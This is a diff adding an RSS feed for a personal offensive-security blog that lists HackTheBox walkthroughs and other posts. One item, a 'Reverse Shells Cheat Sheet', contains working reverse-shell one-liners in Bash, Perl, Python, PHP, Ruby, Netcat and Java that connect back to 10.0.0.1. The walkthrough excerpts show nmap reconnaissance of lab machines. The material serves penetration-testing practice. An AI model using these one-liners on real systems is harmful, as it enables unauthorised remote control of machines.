@@ -1,0 +1,145 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Kiril&#39;s Security Blog</title>
+    <link>https://www.offsec.dev/posts/</link>
+    <description>Recent content in Posts on Kiril&#39;s Security Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Copyright (c) 2008 - 2020, Kiril Stefanov; all rights reserved.</copyright>
+    <lastBuildDate>Mon, 18 May 2020 13:00:43 +0300</lastBuildDate>
+    
+	<atom:link href="https://www.offsec.dev/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Ansi_art</title>
+      <link>https://www.offsec.dev/posts/ansi_art/</link>
+      <pubDate>Mon, 18 May 2020 13:00:43 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/ansi_art/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Ctf_post</title>
+      <link>https://www.offsec.dev/posts/ctf_post/</link>
+      <pubDate>Mon, 18 May 2020 12:59:46 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/ctf_post/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Blog</title>
+      <link>https://www.offsec.dev/posts/blog/</link>
+      <pubDate>Mon, 18 May 2020 12:57:35 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/blog/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>https://www.offsec.dev/posts/about/</link>
+      <pubDate>Mon, 18 May 2020 12:51:53 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/about/</guid>
+      <description>Whoami  Hi, My name is Kiril, I&amp;rsquo;m OSCP / System &amp;amp; Network Administrator / Ethical Hacker / Bug Bounty Hunter / HackTheBox fan     
+    Couple of key things about me: Born in 1987 ever since I was able to walk and say things other than Gu,gu,Ga,ga I was constanly fooling around with computers.
+How long ago was that you may ask &amp;hellip; remember this beautie</description>
+    </item>
+    
+    <item>
+      <title>Enum</title>
+      <link>https://www.offsec.dev/posts/enum/</link>
+      <pubDate>Fri, 15 May 2020 20:15:58 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/enum/</guid>
+      <description>hugoBasicExample This is an example site for Hugo.
+It is intended to be a demo site for the various Hugo themes.
+Using  Install Hugo Clone this repository  git clone https://github.com/gohugoio/hugoBasicExample.git cd hugoBasicExample Clone the repository you want to test. If you want to test all hugo themes, you can clone the full list  git clone --recursive https://URL/OF/YOUR/THEME themes/YOURTHEME or
+git clone --recursive https://github.com/gohugoio/hugoThemes.git themes Run Hugo and select the theme of your choosing  hugo server -t YOURTHEME hugoBasicExample This is an example site for Hugo.</description>
+    </item>
+    
+    <item>
+      <title>Reverse Shells Cheat Sheet</title>
+      <link>https://www.offsec.dev/posts/shells/</link>
+      <pubDate>Fri, 15 May 2020 20:15:41 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/shells/</guid>
+      <description>Bash  bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1  Perl  perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;  Python  python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;  PHP  php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;  Ruby  ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;  Netcat  nc -e /bin/sh 10.0.0.1 1234  Java  r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
+    </item>
+    
+    <item>
+      <title>Writeups</title>
+      <link>https://www.offsec.dev/posts/writeups/</link>
+      <pubDate>Fri, 15 May 2020 17:29:25 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/writeups/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Resources</title>
+      <link>https://www.offsec.dev/posts/resources/</link>
+      <pubDate>Fri, 15 May 2020 17:29:15 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/resources/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Beep Walkthrough</title>
+      <link>https://www.offsec.dev/posts/beep/</link>
+      <pubDate>Fri, 19 Jul 2019 22:50:31 +0202</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/beep/</guid>
+      <description>Easy linux box with lost of paths to root - LFI with password reusage, LFI to RCE via mail, Shellshock and so on.
+ 1. Recon and Information gathering Nmap root@kali:/vagrant/hackthebox/beep# nmap -sV -sC 10.10.10.7 -oN base_tcp.nmap Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-07-17 20:25 EEST Nmap scan report for 10.10.10.7 Host is up (0.033s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Devel Walkthrough</title>
+      <link>https://www.offsec.dev/posts/devel/</link>
+      <pubDate>Sat, 13 Jul 2019 10:30:31 +0202</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/devel/</guid>
+      <description>Time for the 3rd box. Another windows machine, this time - unpatched Windows 7 with&amp;hellip; weird anonymous read/write access to the document root :) Again not the most interesting initial foothold, but it&amp;rsquo;s a practice :)
+ 1. Recon and Information gathering Nmap root@warmachine:/hackthebox/devel# nmap -sV -sC 10.10.10.5 -oN base_tcp.nmap Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-12 17:08 EEST Nmap scan report for 10.10.10.5 Host is up (0.036s latency).</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Lame Walkthrough</title>
+      <link>https://www.offsec.dev/posts/lame/</link>
+      <pubDate>Wed, 10 Jul 2019 17:23:31 +0200</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/lame/</guid>
+      <description>I decided to start HackTheBox from the beginning and do a writeup while doing every box. The first one in the list is Lame. An easy box based on Metasploitable. Hope those posts can help someone other than me, but in the end I&amp;rsquo;m doing them for learning/note taking - if you have any complaints/suggestions/questions - hit me at twitter.
+ 1. Recon and Information gathering Nmap root@warmachine:/hackthebox/lame# nmap -sV -sC 10.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Access Walkthrough</title>
+      <link>https://www.offsec.dev/posts/cache/</link>
+      <pubDate>Sat, 02 Mar 2019 17:23:31 +0200</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/cache/</guid>
+      <description>1. Recon and Information gathering Nmap ╭─root@warmachine ~/hackthebox/access ╰─# cat base_tcp.nmap # Nmap 7.70 scan initiated Sun Feb 24 22:40:43 2019 as: nmap -sV -sC -oN base_tcp.nmap 10.10.10.98 Nmap scan report for 10.10.10.98 Host is up (0.037s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can&amp;#39;t get directory listing: PASV failed: 425 Cannot open data connection.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Aragog Walkthrough</title>
+      <link>https://www.offsec.dev/posts/aragog/</link>
+      <pubDate>Thu, 26 Jul 2018 23:39:09 +0300</pubDate>
+      
+      <guid>https://www.offsec.dev/posts/aragog/</guid>
+      <description>1. Recon and Information gathering Machine name: Aragog
+IP: 10.10.10.78
+OS: Linux
+Nmap nmap -A 10.10.10.78 -oN base.nmap
+Nmap scan report for 10.10.10.78 Host is up (0.13s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r--r--r-- 1 ftp ftp 86 Dec 21 2017 test.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.</description>
+    </item>
+    
+  </channel>
+</rss>
